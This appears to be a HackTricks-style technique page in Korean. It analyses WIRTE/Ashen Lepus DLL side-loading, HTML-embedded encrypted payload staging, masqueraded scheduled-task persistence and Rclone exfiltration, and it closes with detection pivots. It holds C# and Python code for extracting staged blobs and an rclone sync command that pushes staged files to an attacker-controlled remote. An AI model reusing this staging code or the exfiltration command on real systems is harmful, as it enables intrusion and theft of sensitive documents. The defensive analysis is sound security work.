# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 기술 개요

Ashen Lepus (aka WIRTE)는 DLL sideloading, staged HTML payloads, 그리고 modular .NET backdoors를 연결하는 반복 가능한 패턴을 무기화하여 중동 지역의 외교 네트워크에 지속성을 확보했습니다. 이 기법은 다음에 기반하기 때문에 어떤 운영자라도 재사용할 수 있습니다:

- **Archive-based social engineering**: 정상적인 PDF가 대상에게 파일 공유 사이트에서 RAR 아카이브를 내려받도록 지시합니다. 아카이브에는 실제처럼 보이는 document viewer EXE, 신뢰된 라이브러리 이름을 딴 악성 DLL(예: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), 그리고 미끼용 `Document.pdf`가 번들로 포함됩니다.
- **DLL search order abuse**: 사용자가 EXE를 더블클릭하면 Windows는 현재 디렉터리에서 DLL import를 해결하고, 악성 로더(AshenLoader)는 신뢰된 프로세스 안에서 실행되는 동시에 미끼 PDF가 열려 의심을 피합니다.
- **Living-off-the-land staging**: 이후 모든 단계(AshenStager → AshenOrchestrator → modules)는 필요할 때까지 디스크에 남지 않으며, 무해해 보이는 HTML 응답 안에 숨겨진 암호화된 블롭으로 전달됩니다.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE는 AshenLoader를 side-load하고, AshenLoader는 host recon을 수행한 뒤 AES-CTR로 이를 암호화하여 `token=`, `id=`, `q=` 또는 `auth=` 같은 회전하는 파라미터 안에 포함시켜 POST합니다. 대상처럼 보이는 API 경로(예: `/api/v2/account`)로 전송됩니다.
2. **HTML extraction**: C2는 클라이언트 IP가 대상 지역으로 지리적 위치가 확인되고 `User-Agent`가 implant와 일치할 때만 다음 스테이지를 노출해 sandboxes를 회피합니다. 체크를 통과하면 HTTP 본문에는 `<headerp>...</headerp>` 블롭이 포함되어 있고, 그 안에 Base64/AES-CTR로 암호화된 AshenStager 페이로드가 들어 있습니다.
3. **Second sideload**: AshenStager는 `wtsapi32.dll`을 import하는 또 다른 정상 바이너리와 함께 배포됩니다. 해당 바이너리에 주입된 악성 복사본은 추가 HTML을 가져오고, 이번에는 `<article>...</article>`을 추출하여 AshenOrchestrator를 복구합니다.
4. **AshenOrchestrator**: 모듈식 .NET 컨트롤러로 Base64 JSON 구성(config)을 디코드합니다. 구성의 `tg`와 `au` 필드를 연결/해시하여 AES 키를 만들고, 그 키로 `xrk`를 복호화합니다. 결과 바이트는 이후 가져오는 각 모듈 블롭에 대한 XOR 키로 사용됩니다.
5. **Module delivery**: 각 모듈은 HTML 주석을 통해 설명되며 파서를 임의의 태그로 리디렉션하여 `<headerp>`나 `<article>`만 찾는 정적 규칙을 무력화합니다. 모듈에는 persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), 및 file exploration (`FE`)가 포함됩니다.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
수비자가 특정 요소를 차단하거나 제거하더라도, 운영자는 HTML 주석에서 힌트한 태그만 변경하면 전달을 재개할 수 있다.

### 빠른 추출 도우미 (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML 스테이징 회피 유사점

최근 HTML smuggling 연구(Talos)는 HTML 첨부물의 `<script>` 블록 안에 Base64 문자열로 숨겨진 페이로드가 런타임에 JavaScript로 디코드되는 사례를 강조합니다. 동일한 기법은 C2 응답에도 재사용할 수 있습니다: 스크립트 태그(또는 다른 DOM 요소) 내부에 암호화된 블롭을 스테이지하고 AES/XOR 이전에 메모리 내에서 디코드하여 페이지가 일반 HTML처럼 보이게 만듭니다. Talos는 또한 `<script>` 태그 내부에서 식별자 이름 변경 + Base64/Caesar/AES 같은 계층적 난독화도 보여주며, 이는 HTML-스테이징된 C2 블롭과 잘 대응됩니다.

## Recent Variant Notes (2024-2025)

- Check Point는 2024년에 여전히 archive-based sideloading에 의존했지만 첫 단계로 `propsys.dll` (stagerx64)을 사용한 WIRTE 캠페인을 관찰했습니다. 이 스테이저는 다음 페이로드를 Base64 + XOR (키 `53`)로 디코드하고, 하드코딩된 `User-Agent`로 HTTP 요청을 보내며, HTML 태그 사이에 임베드된 암호화 블롭을 추출합니다. 한 분기에서는 긴 임베디드 IP 문자열 목록을 `RtlIpv4StringToAddressA`로 디코드한 뒤 연결하여 스테이지를 재구성했습니다.
- OWN-CERT는 이전 WIRTE 툴링을 문서화했는데, 여기서 사이드로드된 `wtsapi32.dll` 드로퍼는 문자열을 Base64 + TEA로 보호하고 DLL 이름 자체를 복호화 키로 사용한 뒤, 호스트 식별 데이터를 XOR/Base64로 난독화하여 C2로 전송했습니다.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: 현재 로더들은 256-bit 키와 논스(예: `{9a 20 51 98 ...}`)를 내장하고 있으며, 복호화 전후로 `msasn1.dll` 같은 문자열을 사용해 선택적으로 XOR 레이어를 추가합니다.
- **Key material variations**: 초기 로더들은 임베디드 문자열을 보호하기 위해 Base64 + TEA를 사용했고, 복호화 키는 악성 DLL 이름(예: `wtsapi32.dll`)에서 파생되었습니다.
- **Infrastructure split + subdomain camouflage**: 스테이징 서버는 도구별로 분리되고 다양한 ASN에 호스팅되며, 때때로 합법적으로 보이는 서브도메인으로 프론팅하여 한 스테이지가 노출되어도 나머지는 보호됩니다.
- **Recon smuggling**: 열거된 데이터에는 이제 Program Files 목록이 포함되어 고가치 앱을 식별하며, 호스트를 떠나기 전에 항상 암호화됩니다.
- **URI churn**: 쿼리 매개변수와 REST 경로는 캠페인마다 회전(`/api/v1/account?token=` → `/api/v2/account?auth=`)하여 취약한 탐지를 무력화합니다.
- **User-Agent pinning + safe redirects**: C2 인프라는 정확한 UA 문자열에만 응답하고, 그렇지 않으면 정상적인 뉴스/건강 사이트로 리다이렉트하여 섞입니다.
- **Gated delivery**: 서버는 지리적 제약을 두고 실제 임플란트에만 응답합니다. 승인되지 않은 클라이언트는 의심스럽지 않은 HTML을 받습니다.

## Persistence & Execution Loop

AshenStager는 Windows 유지관리 작업으로 가장되는 예약 작업을 드롭하고 `svchost.exe`를 통해 실행합니다. 예:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

이 예약 작업들은 부팅 시 또는 일정 간격으로 sideloading 체인을 재실행하여 AshenOrchestrator가 디스크를 다시 건드리지 않고도 최신 모듈을 요청할 수 있게 합니다.

## Using Benign Sync Clients for Exfiltration

운영자들은 전용 모듈을 통해 외교 문서를 `C:\Users\Public`(모두 읽기 가능하고 의심스럽지 않음)에 스테이지한 뒤, 합법적인 [Rclone](https://rclone.org/) 바이너리를 다운로드하여 해당 디렉터리를 공격자 저장소와 동기화합니다. Unit42는 이 행위자가 exfiltration에 Rclone을 사용한 것이 처음 관찰된 사례라고 지적했으며, 이는 정상 트래픽에 섞이기 위해 합법적 동기화 툴을 악용하는 더 넓은 추세와 일치합니다:

1. **Stage**: 대상 파일을 `C:\Users\Public\{campaign}\`로 복사/수집합니다.
2. **Configure**: 공격자 제어 HTTPS 엔드포인트(예: `api.technology-system[.]com`)를 가리키는 Rclone 설정을 배포합니다.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`를 실행하여 트래픽이 일반 백업처럼 보이게 합니다.

Rclone이 합법적 백업 워크플로에서 널리 사용되므로, 수비 측은 의심스러운 실행(새 바이너리, 이상한 원격지, 또는 `C:\Users\Public`의 갑작스런 동기화)에 주목해야 합니다.

## Detection Pivots

- 사용자 쓰기 가능 경로에서 DLL을 예기치 않게 로드하는 **signed processes**에 대해 경보 설정(Procmon 필터 + `Get-ProcessMitigation -Module`), 특히 DLL 이름이 `netutils`, `srvcli`, `dwampi` 또는 `wtsapi32`와 겹칠 때.
- 의심스러운 HTTPS 응답에서 **이상한 태그 안에 임베드된 대형 Base64 블롭** 또는 `<!-- TAG: <xyz> -->` 주석으로 보호된 내용을 검사합니다.
- HTML 수색을 확장하여 JavaScript로 디코드된 후 AES/XOR 처리되는 `<script>` 블록 내의 Base64 문자열(HTML smuggling 스타일 스테이징)을 찾아봅니다.
- `svchost.exe`를 비서비스 인수로 실행하거나 드로퍼 디렉터리를 가리키는 **scheduled tasks**를 수색합니다.
- 정확한 `User-Agent` 문자열에만 페이로드를 반환하고 그렇지 않으면 정상 도메인으로 바운스하는 **C2 리다이렉트**를 추적합니다.
- IT 관리 위치 외부에 나타나는 **Rclone** 바이너리, 새로운 `rclone.conf` 파일, 또는 `C:\Users\Public` 같은 스테이징 디렉터리에서 데이터를 당기는 동기화 작업을 모니터링합니다.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
